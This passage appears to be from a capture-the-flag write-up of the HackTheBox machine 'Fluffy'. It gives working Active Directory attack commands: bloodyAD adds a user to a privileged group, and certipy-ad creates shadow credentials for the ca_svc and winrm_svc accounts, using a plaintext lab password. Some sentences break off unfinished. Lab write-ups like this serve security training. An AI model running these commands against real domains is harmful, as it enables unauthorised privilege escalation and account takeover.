1.- Add us to the “Service Account”
![](<attachments/Pasted image 20260102195723.png>)
We will use this tool to add ourselves.
![](<attachments/Pasted image 20260102195945.png>)

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 add groupMember 'service accounts' p.agila
```

Now, if we don't join that group
2.-

Now we can use certipy to create the shadow credential

![](<attachments/Pasted image 20260102201144.png>)

![](<attachments/Pasted image 20260102205008.png>)

```bash
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb
```

![](<attachments/Pasted image 20260102205329.png>)
```bash
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb
```


